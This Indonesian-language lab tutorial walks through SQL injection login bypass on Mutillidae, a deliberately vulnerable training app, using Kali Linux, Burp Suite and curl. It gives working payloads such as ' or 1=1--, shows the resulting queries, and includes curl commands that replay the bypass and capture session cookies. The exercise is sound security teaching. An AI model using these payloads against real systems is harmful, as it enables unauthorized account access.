Lesson 6
--------
### Section 6: Open Console Terminal and Retrieve IP Address
- **Step 1**    : Buka Terminal Kali Linux
- **Step 2**    : Dapatkan IP address dari Kali Linux
    ```
    ifconfig
    ```
    - IP address yang didapatkan `10.151.64.195`
    - VM Kali Linux ini akan digunakan sebagai penyerang Metasploitable
    ![](/assets/lesson-6/ifconfig.png)

### Section 7: Start Web Browser Session to Mutillidae
- **Step 1**    : Buka Mozilla Firefox
- **Step 2**    : Buka Multilidae
    ![](/assets/lesson-6/open_multilidae.png)

### Section 8: Go To Login Page
- **Step 1**    : Klik Login/Register
    ![](/assets/lesson-6/click-login.png)

### Section 9: Configure Firefox Proxy Settings
- **Step 1**    : Buka Preference > Advanced > Network > Settings...
- **Step 2**    : Konfirgurasi Proxy
    - Klik **Manual Proxy Configuration**
    - Ketik `127.0.0.1` di kolom **HTTP Proxy**
    - Ketik `8080` di kolom **Port**
    - Check **Use this proxy server for all protocols**
    - Klik Ok
    - Klik Close
    ![](/assets/lesson-6/config-proxy.png)
    
### Section 10: Configure Burpsuite Settings
- **Step 1**    : Buka Burpsuite melalui Applications > Web Application Analysis > Burpsuite
    ![](/assets/lesson-6/VirtualBox_kali_19_12_2017_12_27_52.png)
- **Step 2**    : Pilih **Temporary project**, lalu **next**
    ![](/assets/lesson-6/temp_project.png)
- **Step 3**    : Pilih **Use Burp defaults**, lalu **Start Burp**
    ![](/assets/lesson-6/burp_config.png)
- **Step 4**    : Buka Proxy > Options, dan pastikan **Port** berupa 8080
    ![](/assets/lesson-6/burp_proxy.png)
- **Step 5**    : Buka Proxy > Intercept, ubah **Intercept is on** menjadi **Intercept is off**
    ![](/assets/lesson-6/proxy-intercept.png)
    
### Section 11: SQL Injection: By-Pass Password Without Username (Obtain Access #1)
- **Step 1**    : Buka Login/Register
- **Step 2**    : Ketik `' or 1=1-- ` di kolom **Name** dengan spasi di akhir `-- `
- **Step 3**    : Klik Login
    ![](/assets/lesson-5/login2.png)
- **Step 4**    : Anda akan berhasil login dengan akun Admin karena Admin berada pada urutan paling atas pada database. Dengan kondisi `1=1` maka akan menghasilkan kondisi yang selalu benar dan `-- ` berguna untuk comment pada SQL, karena itu query selanjutnya akan dibatalkan **(AND password='')**.
    ![](/assets/lesson-5/login2_berhasil.png)
    - Query yang dihasilkan:
    ```
    SELECT * FROM accounts WHERE username='' or 1=1-- ' AND password=''
    ```
    - Query yang sebenarnya dikerjakan:
    ```
    SELECT * FROM accounts WHERE username='' or 1=1
    ```
- **Step 5**    : Lihat data request **POST**
    - Klik Proxy Tab
    - Klik HTTP History
    - Klik baris yang berisi `/mutillidae/index.php?page=login.php`
    - Klik Request Tab
    _ Klik Raw Tab
    - Lihat **POST** Data String        
        ```
        username=%27+or+1%3D1--+&password=&login-php-submit-button=Login
        ```
        - `%27` adalah petik satu (')
        - `+` adalah spasi
        - `%3D` adalah sama dengan (=)
        ![](/assets/lesson-6/obtain_1.png)
        
### Section 12: Simulate CURL SQL Injection: (Obtain Access #1)
- **Step 1**    : Klik Logout
- **Step 2**    : Gunakan Curl untuk mekakukan login dengan **POST** data yang didapatkan dengan Burpsuite pada Section 11
    ```
    curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=%27+or+1%3D1--+&password=&login-php-submit-button=Login" --location "http://10.151.36.64/mutillidae/index.php?page=login.php" > login1.txt
    ```
    - menampilkan hasil "Logged In Admin"
        ```
        grep "Logged In" login1.txt
        ```
    - menampilkan **session cookies** beserta **PHP session ID** (PHPSESSID)
        ```
        cat crack_cookies.txt
        ```
    ![](/assets/lesson-6/obtain_1_curl.png)
    
### Section 13: SQL Injection: Single Quote Test On Password Field (Obtain Access #2)
- **Step 1**    : Buka Login/Register.
- **Step 2**    : Ketik `samurai` di kolom **Name**.
- **Step 3**    : Klik Kanan di kolom **Password**.
- **Step 4**    : Klik **Inspect Element**.
    ![](/assets/lesson-5/inspect-element-password.png)
- **Step 5**    : Ganti `password` dengan kata `text` pada elemen **type**. Ganti elemen maxlength menjadi `50` dan elemen size menjadi `50`
    ![](/assets/lesson-5/inspect-password-size.png)
- **Step 6**    : Ketik `' or (1=1 and username='samurai')-- ` di kolom **Password**. Jangan lupa memberikan spasi setelah `-- `
- **Step 7**    : Klik Login. Perhatikan kolom password sudah tidak lagi tersensor dengan bintang karena **type** sudah diganti menjadi `text`.
    ![](/assets/lesson-5/non-obfused-pass-2.png)
    - Anda akan berhasil login sebagai `samurai`
    ![](/assets/lesson-5/samurai-logged-in.png)
    - Query yang dihasilkan
    ```
    SELECT * FROM accounts WHERE username='samurai' AND password='' or (1=1 and username='samurai')-- '
    ```
- **Step 8**    : Lihat data request **POST**
    - Klik Proxy Tab
    - Klik HTTP History
    - Klik baris yang berisi `/mutillidae/index.php?page=login.php`
    - Klik Request Tab
    - Klik Raw Tab
    - Block semuta teks lalu klik kanan
    - Klik "Copy to File"
        ![](/assets/lesson-6/obtain_2.png)
    - Simpan sebagai `burp2.txt`
- **Step 9**    : Lihat Post Data
    - `grep -i cookie burp2.txt`
    - `grep -i username burp2.txt`
    ![](/assets/lesson-6/burp2-txt.png)
- **Step 10**    : Logout dan tutup Mozilla Firefox

### Section 14: Simulate cURL SQL Injection: (Obtain Access #2)
- **Step 1**    : Buka Terminal
- **Step 2**    : Hapus file crack_cookies.txt
    ```
    rm crack_cookies.txt
    ```
- **Step 3**    : Gunakan **POST** Data dari burp2.txt
    ```
    grep -i username burp2.txt
    ```
- **Step 4**    : Lakukan Autentikasi menggunakan Curl
    ```
    curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=samurai&password=%27+or+%281%3D1+and+username%3D%27samurai%27%29--+&login-php-submit-button=Login" --location "http://10.151.36.64/mutillidae/index.php?page=login.php" > login2.txt
    ```
    



    